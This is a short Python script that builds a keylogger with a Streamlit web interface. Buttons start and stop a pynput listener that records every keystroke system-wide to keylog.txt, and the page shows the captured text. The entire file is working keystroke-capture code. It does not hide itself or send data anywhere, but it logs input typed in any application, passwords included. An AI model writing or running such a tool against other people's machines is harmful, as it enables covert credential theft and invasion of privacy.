import streamlit as st
import os
import threading
from pynput import keyboard

# File where keystrokes will be saved
LOG_FILE = "keylog.txt"

# Global flag for keylogger status
keylogger_running = False
listener = None  # To hold the listener object

# Function to handle key presses
def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)  # Write normal letters together
            else:
                f.write(f" {key} ")  # Space out special keys (Enter, Alt, etc.)
    except Exception as e:
        print(f"Error: {e}")

# Function to start keylogger in a separate thread
def start_keylogger():
    global keylogger_running, listener

    if keylogger_running:
        return  # Prevent multiple instances

    keylogger_running = True

    # Clear the file at start
    with open(LOG_FILE, "w") as f:
        f.write("")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# Function to stop keylogger
def stop_keylogger():
    global keylogger_running, listener

    if listener:
        listener.stop()  # Stop listening
        listener = None  # Reset listener object

    keylogger_running = False

# Streamlit UI
st.title("🔑 Keylogger")

if st.button("Start Keylogger"):
    start_keylogger()
    st.success("Keylogger started!")

if st.button("Stop Keylogger"):
    stop_keylogger()
    st.warning("Keylogger stopped!")

# Show log file contents in Streamlit
if os.path.exists(LOG_FILE):
    with open(LOG_FILE, "r") as f:
        st.text_area("Keylog Output", f.read(), height=200)
